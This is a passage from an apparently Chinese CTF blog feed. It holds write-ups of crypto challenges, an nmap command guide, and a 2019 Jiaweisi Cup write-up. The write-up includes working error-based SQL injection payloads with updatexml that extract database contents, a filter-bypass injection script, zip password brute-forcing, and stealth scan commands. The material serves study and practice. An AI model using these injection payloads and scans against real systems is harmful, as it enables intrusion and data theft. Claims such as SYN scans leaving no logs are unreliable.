5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L] 对n进行因式分解获得pq 分解p q网站 然后一个解密脚本 # encoding:utf8 import rsa import sys import gmpy2 marr= [264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L] p = 54163 q = 101929 n = 5520780427 e = 134257 d= int(gmpy2.invert(e , (p-1) * (q-1))) result=&quot;&quot; for j in marr: result += chr(pow(j,d,n)) print result 得到 U2FsdGVkX1/8DKBmhvO87/SOLaawwxvAdHLB9AV62nC6LhXzhatpvBcg6tlK7Fs5 对其进行DES解密 得到flag jactf{So_easy_RSA_and_DES} 贝叶斯打开是一个密码本 需要解密 仿射密码 脚本如下 #include &lt;iostream&gt; #include &lt;cstring&gt; using namespace std; int gcd(int m, int n); int init_gcd(int m, int n); int des_find(string p, int m); #define PSIZE 65 //宏定义密码表大小 int main() { string P(&quot;zQWERTYUIOPxcvbnmasdfASDFGHJKLghjkl_qwZXCVBNMert{yuiop}0123498765&quot;), M(&quot;gf9C{YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7&quot;); //明文空间，与已知密文 string C; //存放解密明文 int i = 2; //求解所有互素的数 int a1; //存放逆元 for (i; i &lt; PSIZE; i++) { if (gcd(i, PSIZE) == 1) { //说明此时的i与28互素 /***求解此时的i的逆元***/ a1 = init_gcd(i, PSIZE); for (int j = 0; j &lt; PSIZE; j++) //控制b的遍历 { cout &lt;&lt; &quot;此时：a=&quot; &lt;&lt; i &lt;&lt; &quot; b=&quot; &lt;&lt; j &lt;&lt; &quot; a的逆元为：&quot; &lt;&lt; a1 &lt;&lt; &quot; \\&quot;&quot;; for (int k = 0; k &lt; M.length(); k++) { //每一个汉字站两个字节，所以要用两个数组空间来存 int where = des_find(P, M[k]); //匹配密文在明文空间的位置 where = ((where - j)*a1) % PSIZE; if (where &lt; 0) { where += PSIZE; } cout &lt;&lt; P[where]; } cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; endl; } } } return 0; } int gcd(int b, int a) //求互素 { int temp; if (a &lt; b)//判断大小 { temp = a; a = b; b = temp; } if (b == 0) return a; else return gcd(b, a%b);//递归 } int init_gcd(int m, int n) //扩展欧几里得算法 { int i = 2; for (i; i &lt; 28; i++) { if ((m*i) % n == 1) { return i; } } } int des_find(string p, int m) //位置匹配函数 { for (int i = 0; i &lt; p.length(); i ++) { //cout&lt;&lt;p[i]&lt;&lt;p[i+1]&lt;&lt;endl; if (m == p[i]) { return i; } } } 跑出来 找到了flag jactf{I_10ve_Crypto_Yov_t0O_e8963F5} 不会奔跑的数字和下划线打开题目发现是 url加密 加密之后 进行base16解密 最后进行base64解密 得到 和flag长得相似的字符串 NEGXJ{48_ter_119_xsoirw_teww} 根据题目 我们只考虑字母发现这一些字符前五位和JACTF的ascii码相差5 str = &quot;NEGXJ{48_ter_119_xsoirw_teww}&quot; str_2 = &quot;NEGXJterxsoirwteww&quot; flag = &quot;&quot; x = 4 for i in str: if i.isalpha(): flag += chr(int(ord(i)-x)) else: flag += i print flag 得到flag: JACTF{48_pan_119_tokens_pass}","categories":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/categories/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"nmap的使用","slug":"nmap的使用","date":"2019-04-08T15:13:29.000Z","updated":"2019-05-29T12:42:50.249Z","comments":true,"path":"2019/04/08/nmap的使用/","link":"","permalink":"http://yoursite.com/2019/04/08/nmap的使用/","excerpt":"nmapNMap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。","text":"nmapNMap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。 nmap的主要功能 探测一组主机是否在线 扫描主机的端口，嗅探所提供的网络服务 推断主机所使用的操作系统 nmap 端口状态的判断open : 应用程序在该端口接受TCP连接或者UDP报文 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。 unfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。 open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。 closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的 nmap的基础语法 namp -A [ip地址]全面扫描指定IP namp 192.168.1.1/24扫描整个子网 nmap [ip地址1] [ip地址2]扫描多个目标 nmap 192.168.1.1-100扫描一个范围内的目标 扫描ip地址为192.168.1.1-192.168.1.100内的所有主机 nmap -iL 1.txt扫描1.txt下的所有的IP列表 nmap -sL 192.168.1.1/24可以看到你扫描的所有主机的列表 nmap 192.168.1.1/24 -exclude 192.168.1.1扫描除了某一个ip外的所有子网主机 nmap 192.168.1.1/24 -exclude 1.txt`扫描除了某一个文件中ip外的子网主机 - nmap -p80,21,23 192.168.1.1 扫描特定主机的80，21，23端口 - nmap -p 80-160 192.168.0.101 扫描指定范围内的端口 - nmap 192.168.0.101,102,103 使用IP地址的最后一个字节扫描多台服务器 以上为nmap的最常用的基础命令 - nmap -sP 192.168.43.8/24 ping扫描方式，只进行ping，然后显示在线的主机。这样获取目标信息而不会被轻易发现发现。ping扫描只是判断主机是否存活在网络中。 - nmap -P0 192.168.1.1 无ping扫描：通常用于防火墙禁止ping的情况下，它能确定正在运行的机器。 nmap -P0 [协议1、协议2] [目标ip]nmap支持的协议和编号1.tcp:对应的协议编号为62.ICMP:对应的协议编号为13.IGMP：对应的协议编号为24.UDP：对应的协议编号为17通过使用TCP、UDP、IGMP协议向目标主机发送包并判断目标主机是否在线 - nmap -sS 192.168.1.1 不会在目标主机产生日志信息，通过TCP的SYN包获取主机信息 - nmap -sT 192.168.1.1 适用于找出TCP和UDP端口 - nmap -sU 192.168.1.1 用来扫描主机打开的UDP端口：不会发送syn包，通过发送udp数据包到目标主机，等待目标主机响应，返回ICMP不可达，代表端口关闭。 - nmap -sF 192.168.1.1 不会在目标主机产生日志信息如果TCP SYN被防火墙拦截，用FIN标志的数据包获取主机信息。（FIN重置位，用来代表断开连接） - nmap -sV 192.168.1.1 扫描目标主机的端口上运行的软件版本 它不是用于扫描目标主机开放的端口，但需要从开放的端口获取信息来判断软件的版本，所以需要先进行端口扫描。 - nmap -sL 192.168.1.7 192.168.1.1 伪装一个主机的ip发送扫描数据包 - nmap -A 192.168.1.1 检测目标主机系统信息和路由信息 - nmap -O 192.168.1.1 检测目标主机操作系统和软件 - nmap -sA 192.168.1.1 扫描住的侦测防火墙 - nmap -PN 192.168.1.1 扫描主机是不是由防火墙的保护 - nmap -F 192.168.1.1 快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其他端口 - nmap -r 192.168.1.1 顺序扫描端口 - nmap --iflist 打印本地主机接口和路由 - nmap -sN 192.168.1.1 TCP空扫描`","categories":[],"tags":[{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/tags/安全工具/"}]},{"title":"2019年嘉韦思杯wp","slug":"上海嘉韦思杯","date":"2019-03-30T16:00:00.000Z","updated":"2019-05-29T12:33:15.805Z","comments":true,"path":"2019/03/31/上海嘉韦思杯/","link":"","permalink":"http://yoursite.com/2019/03/31/上海嘉韦思杯/","excerpt":"2019年嘉韦思杯wp","text":"2019年嘉韦思杯wp 土肥原贤二发现存在报错注入的可能： 于是进行尝试 1&#39; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)# 得到信息： could not to the database XPATH syntax error: &#39;~5.7.25-log~&#39; 爆库： 1&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)# could not to the database XPATH syntax error: &#39;~luozhen~&#39; 爆表： 1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)# could not to the database XPATH syntax error: &#39;~flag,goods~&#39; 爆列名： 1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),0x7e),1)# could not to the database XPATH syntax error: &#39;~id,flag~&#39; 得到flag: 1&#39; and updatexml(1,concat(0x7e,(SELECT flag from flag),0x7e),1)# could not to the database XPATH syntax error: &#39;~20_welcome_19~&#39; flag{20_welcome_19} 吴佩孚打开连接发现是特别长的一个字符串 二话不说直接base64解码 (![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]) 这个是jsfuck加密在线解密 得到flag flag{sdf465454dfgert32} 死亡真相发现是一段声音录像 将WAV文件放入Audacity中 查看频普图发现提示 flag：85a9d4517d4725_b9_8cbc9fd_554216 但是提交不上去 发现是个假的flag 通过查看文件属性发现多次出现0于是将_替换为0 ： 85a9d4517d47250b908cbc9fd0554216 再由md5解密可得flag：hsd132456 日军空袭发现这有事以长传的字符串 老样子 base64解码 这下需要点好多次 fB__l621a4h4g_ai{&amp;i} 的到这样的字符串 仔细观察 发现别有玄机 fB__ l621 a4h4 g_ai {&amp;i} 竖着看就可得到flag flag{B64_&amp;_2hai_14i} 戴星炳打开页面 天下武功，唯快不破！你能在2秒内算出下面的数学表达式结果吗？ 0x11 * (0x63 + 0xEE) + ( 0x30 ^ 0x1C) + 0x8D % 0xF6 + 0x19 这就要写脚本跑一下了 #!/usr/bin/python #coding=utf-8 import re import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) s = requests.Session() url = &#39;http://47.103.43.235:82/web/a/index.php&#39; r = s.get(url=url) # print r.text a = re.search(r&#39;&lt;/p&gt;&lt;p&gt;(.*)&lt;/p&gt;\\n&lt;form&#39;, r.text, re.M | re.S).group(1) res = eval(a) data ={ &#39;result&#39;:res, &#39;Submit&#39;:&#39;Submit&#39; } print eval(a) b =s.post(url=url,data=data) print b.text 得到flag flag{Y0U_4R3_3o_F4ST!} 大美晚报打开题目链接后是一个二维码，保存下来binwalk一下发现存在压缩包，-e参数分离出来 打开后发现有加密，但是给出来提示 那这就好办了，密码全部是数字，可以用压缩包爆破神器ARCHPR.exe来进行爆破，时间比较长,爆破出来密码是：674290437 flag：flag{d6@YX$_m^aa0} 得到flag：flag{d6@YX$_m^aa0} 潘汉年打开得到了一个字符串 bg[`sZ*Zg&#39;dPfP`VM_SXVd 想了一下 有可能会和ascii码有关所以 bg[`sZ*Zg&#39;dPfP`VM_SXVd的ASCII码为： 98,103,91,96,115,90,42,90,103,39,100,80,102,80,96,86,77,95,83,88,86,100 flag的ASCII码为： 102,108,97,103 观察发现他们的第一位 相差4 第二位相差5 第三位相差6 str = &quot;bg[`sZ*Zg&#39;dPfP`VM_SXVd&quot; # str_1 = &quot;flag&quot; flag = &quot;&quot; j=4 for i in range(len(str)): flag += chr(ord(str[i])+j) j = j+1 print flag 得到flag: flag{c4es4r_variation} 袁殊解题步骤：下载文件解压：得到两个文件 用kali linux的 openssl openssl rsa -pubin -text -modulus -in warmup -in RSA256/RSA256/gy.key 得到： Public-Key: (256 bit) Modulus: 00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd: c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0: 89:12:d9 Exponent: 65537 (0x10001) Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9 writing RSA key -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni 0bXTcqTQiRLZAgMBAAE= -----END PUBLIC KEY----- 可以看到Exponent: 65537，这里成为en的十六进制是Modules：A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9用python转成转成十进制： &gt;python Python 3.6.4 (v3.6.4:d48eceb, Dec 19 2017, 06:54:40) [MSC v.1900 64 bit (AMD64)] on win32 Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; a=0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9 &gt;&gt;&gt; a 76775333340223961139427050707840417811156978085146970312315886671546666259161 再将n进行因式分解来得到我p和q (使用http://factordb.com/) p=273821108020968288372911424519201044333 q=280385007186315115828483000867559983517 最后写好脚本，得出flag： #coding:utf-8 import gmpy import rsa p = 273821108020968288372911424519201044333 q = 280385007186315115828483000867559983517 n = 76775333340223961139427050707840417811156978085146970312315886671546666259161 e = 65537 d = int(gmpy.invert(e , (p-1) * (q-1))) privatekey = rsa.PrivateKey(n , e , d , p , q) #根据已知参数，计算私钥 with open(&quot;./fllllllag.txt&quot; , &quot;rb&quot;) as f: print(rsa.decrypt(f.read(), privatekey).decode()) #使用私钥对密文进行解密，并打印 flag{_2o!9_CTF_ECUN_}晴气庆胤打开页面得到： 查看页面源代码： 发现这中类行题 以前遇见过直接playload 这样就得到了flag 冈村宁次打开网址为：http://47.103.43.235:83/web/a/index.php?id===QM 感觉他传递的参数有一点像base64 发现是1 base64编码的逆序输出 所以测试一下：传递参数：if(1,1,2) 编码后为：pIDLxwSMoYWa 传递参数：if(0,1,2) 编码后为：pIDLxwCMoYWa fuzz一下 发现了 过滤了 空格 等号 其中 空格用 /*1*/ 绕过 等号用 like 绕过 于是编写脚本 import base64 import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) def string_reverse(m): s = base64.b64encode(m) num=len(s) a=&quot;&quot; for i in range(num): a += s[num-1-i] return a url 